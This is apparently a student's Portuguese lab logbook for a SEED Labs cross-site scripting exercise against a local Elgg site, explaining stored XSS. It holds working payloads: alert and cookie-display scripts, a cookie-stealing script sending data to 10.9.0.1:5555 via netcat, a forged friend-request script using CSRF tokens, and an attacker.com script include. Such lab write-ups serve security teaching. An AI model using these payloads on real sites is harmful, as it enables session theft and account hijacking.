# Cross-Site Scripting (XSS) Attack Lab

## Questão 1
__Task 1:__  

**Objetivo:** Injetar código JavaScript no perfil do Elgg para que, quando outro utilizador visualize o perfil, uma janela de alerta seja exibida.

**Passos**
1. Fazer login como `alice` (`seedalice`) em `http://www.seed-server.com`.  
2. Ir a *Edit Profile* → campo *Brief description*.  
3. Inserir:
   ```html
   <script>alert('XSS');</script>
4. Guardar as alterações.

5. Fazer login como outro utilizador (ex.: boby / seedboby).

6. Visitar o perfil de alice.

**Resultado:**
Ao visitar o perfil de `alice` com a conta boby, aparece uma janela modal (alert) com o texto **"XSS"**, confirmando que o código JavaScript malicioso foi executado no navegador da vítima.  

![image](docs/logbook7/LOGBOOK7(1).png)

O código JavaScript foi armazenado no campo "Brief description" do perfil de alice. Quando qualquer utilizador acede ao perfil, o navegador interpreta o código `<script>` como legítimo e executa-o, demonstrando uma vulnerabilidade XSS do tipo **Stored XSS**.

__Task 2:__  

**Objetivo:** Modificar o código JavaScript para exibir os cookies da vítima na janela de alerta.

**Passos**
1. Login como **alice**.
2. Editar o perfil e modificar o código JavaScript no campo *Brief description*:

   ```html
   <script>alert(document.cookie);</script>
   ```
3. Guardar as alterações.
4. Login como **boby** e visitar o perfil de alice

**Resultado:**
A janela de alerta agora exibe os cookies da sessão de boby, incluindo informações sensíveis como o cookie de sessão do Elgg.

![image](docs/logbook7/LOGBOOK7(2).png)

Este ataque demonstra como um atacante pode visualizar informações sensíveis da vítima, nomeadamente tokens de sessão que podem ser usados para sequestrar a sessão (session hijacking).

__Task 3:__

**Objetivo:** Enviar os cookies da vítima para a máquina do atacante através de um pedido HTTP.

**Passos**
1. Na máquina do atacante (VM), iniciar um servidor TCP na porta 5555:
   ```bash
   nc -lknv 5555
2. Login como **alice** e modificar o código no perfil:
   ```html
   <script>
   document.write('<img src=http://10.9.0.1:5555?c=' + escape(document.cookie) + ' >');
   </script>
   ```
3. Guardar as alterações
4. Login como **boby** e visitar o perfil de alice
5. Observar a saída no terminal onde o netcat está a correr

**Resultado:**
O servidor netcat recebe um pedido HTTP GET contendo os cookies de boby:


![image](docs/logbook7/LOGBOOK7(3).png)

O código JavaScript injeta dinamicamente uma tag `<img>` no HTML da página. Quando essa tag é criada, o navegador tenta carregar a “imagem”, fazendo um pedido HTTP GET para o servidor do atacante (10.9.0.1:5555), incluindo os cookies da vítima como parte da URL.
Como o browser envia automaticamente este pedido, os cookies são transmitidos para o atacante, que os pode usar para personificar a vítima.

__Task 4:__

**Objetivo:** Forjar um pedido HTTP a partir do navegador da vítima para adicionar "Samy" como amigo, sem intervenção do atacante.

**Passos**

1. Login como **alice**
2. Abrir **Firefox Developer Tools** → **Network Tab** (ou usar extensão HTTP Header Live)
3. Visitar o perfil de **samy** e clicar em **Add friend**
4. Observar o pedido HTTP capturado:
   - **Método:** GET
   - **URL:** `http://www.seed-server.com/action/friends/add?friend=59&__elgg_ts=1763547462&__elgg_token=lxFFQO2GjDz8BjBktleC3Q`
   - **Parâmetros importantes:**
     - `friend`: GUID do utilizador a adicionar como amigo
     - `__elgg_ts`: Timestamp de segurança
     - `__elgg_token`: Token CSRF (Cross-Site Request Forgery)

![image](docs/logbook7/LOGBOOK7(4).png)

**Código malicioso (injetado no perfil de Samy):**

1. Login como **samy** (seedsamy)
2. Editar o perfil de Samy (campo **About Me**, modo **Edit HTML**) e inserir:

```html
<script type="text/javascript">
window.onload = function () {
    var ts = "&__elgg_ts=" + elgg.security.token.__elgg_ts;
    var token = "&__elgg_token=" + elgg.security.token.__elgg_token;
    var samyGuid = 59;
    
    var sendurl = "http://www.seed-server.com/action/friends/add?friend=" + samyGuid + ts + token;
    
    var Ajax = new XMLHttpRequest();
    Ajax.open("GET", sendurl, true);
    Ajax.send();
}
</script>
```

4. Guardar as alterações
5. Login como **boby** e visitar o perfil de **samy**

**Resultado:**
Boby adiciona automaticamente Samy como amigo sem qualquer ação consciente. Ao verificar a lista de amigos de boby, Samy aparece na lista.

![image](docs/logbook7/LOGBOOK7(5).png)

---

**Respostas às questões:**

**Question 1: Explain the purpose of Lines ➀ and ➁, why are they needed?**

```javascript
var ts = "&__elgg_ts=" + elgg.security.token.__elgg_ts;     // ➀
var token = "&__elgg_token=" + elgg.security.token.__elgg_token; // ➁
```
Estas linhas extraem os **tokens de segurança CSRF** da sessão da vítima.

- **`__elgg_ts`**: Timestamp que valida que o pedido é recente (previne ataques antigos)
- **`__elgg_token`**: Token que valida que o pedido vem de uma página legítima do Elgg

**Por que são necessários?**

O Elgg exige estes parâmetros em todos os pedidos que alteram dados (adicionar amigo, editar perfil, etc.) como proteção contra ataques CSRF. 

Como o nosso código JavaScript malicioso executa **dentro do domínio do Elgg**, consegue aceder ao objeto `elgg.security.token` que contém os tokens válidos da sessão da vítima. Sem estes tokens, o servidor rejeitaria o pedido.

---

**Question 2: If the Elgg application only provides the Editor mode for the "About Me" field, can you still launch a successful attack?**

**Resposta:**

Sim, mas é mais difícil. Alternativas:

1. **Usar link approach:** Hospedar o JavaScript num servidor externo:
   ```html
   <script src="http://attacker.com/malicious.js"></script>
   ```

2. **Event handlers:** Usar eventos em tags HTML:
   ```html
   <img src="x" onerror="alert('XSS')">
   ```

No entanto, o modo Text é mais confiável porque garante que o código é inserido exatamente como pretendido, sem alterações do editor visual.


## Questão 2

### Modalidades de Ataques XSS

**Em qual modalidade se enquadra este ataque?**

**Resposta: Stored XSS (XSS Persistente)**

**Porquê?**

1. **O código é armazenado no servidor** (base de dados do Elgg)
2. **Executa automaticamente** quando alguém visita o perfil
3. **Afeta múltiplos utilizadores** (todos que veem o perfil)
4. **É permanente** até ser removido

**Diferenças das outras modalidades:**

- **Reflected XSS**: O código vem num link e é refletido imediatamente (não é armazenado). Requer que cada vítima clique num link especial.

- **DOM-based XSS**: A vulnerabilidade está no JavaScript do cliente, não no servidor.

**Conclusão:**

Este é **Stored XSS** porque o código malicioso fica guardado permanentemente no perfil e afeta todos os visitantes. É o tipo mais perigoso de XSS.
